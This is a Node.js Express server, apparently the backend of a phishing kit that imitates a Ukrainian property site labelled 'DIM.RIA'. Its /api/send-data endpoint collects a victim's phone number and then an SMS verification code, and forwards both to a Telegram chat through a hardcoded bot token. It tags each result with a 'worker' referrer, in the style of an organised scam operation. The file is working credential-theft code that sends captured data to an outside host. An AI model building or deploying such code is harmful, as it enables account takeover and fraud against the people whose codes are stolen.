const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// === МАРШРУТ ДЛЯ ГЛАВНОЙ СТРАНИЦЫ (ФИКС ДЛЯ RENDER) ===
app.get('/', (req, res) => {
    console.log('Запрос на главную страницу');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// === МАРШРУТ ДЛЯ ПАНЕЛІ ===
app.get('/panel', (req, res) => {
    console.log('Запрос на панель');
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Функція відправки в Telegram (с retry для Render)
async function sendToTelegram(message, retryCount = 0) {
    console.log(`Попытка отправки в Telegram (попытка ${retryCount + 1}):`, message.substring(0, 100) + '...');

    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params),
            timeout: 10000  // 10 сек таймаут
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка Telegram API:', errorData);
            throw new Error(`HTTP ${response.status}: ${errorData.description}`);
        }

        const result = await response.json();
        console.log('Успешно отправлено в Telegram:', result);
        return true;
    } catch (error) {
        console.error('Помилка відправки:', error.message);
        
        // Retry 1 раз при сетевой ошибке
        if (retryCount < 1 && (error.message.includes('timeout') || error.message.includes('ENOTFOUND') || error.message.includes('ECONNREFUSED'))) {
            console.log('Повторная попытка через 2 сек...');
            await new Promise(resolve => setTimeout(resolve, 2000));
            return sendToTelegram(message, retryCount + 1);
        }
        
        return false;
    }
}

// === ОБРОБКА ДАНИХ З ФОРМИ ===
app.post('/api/send-data', async (req, res) => {
    console.log('Получен запрос на /api/send-data:', req.body);

    const { step, phone, code, referrer } = req.body;

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина`;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS:*\n\`${code}\``;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else {
        console.error('Невірні дані в запросе');
        return res.status(400).json({ success: false, message: 'Невірні дані' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        console.log('Успешно обработан запрос:', step);
        res.json({ success: true });
    } else {
        console.error('Не удалось отправить в Telegram');
        res.status(500).json({ success: false, message: 'Помилка сервера' });
    }
});

// Запуск
app.listen(port, () => {
    console.log(`Сервер запущено на порту ${port}`);
    console.log(`Главная: http://localhost:${port}/`);
    console.log(`Панель: http://localhost:${port}/panel`);
});
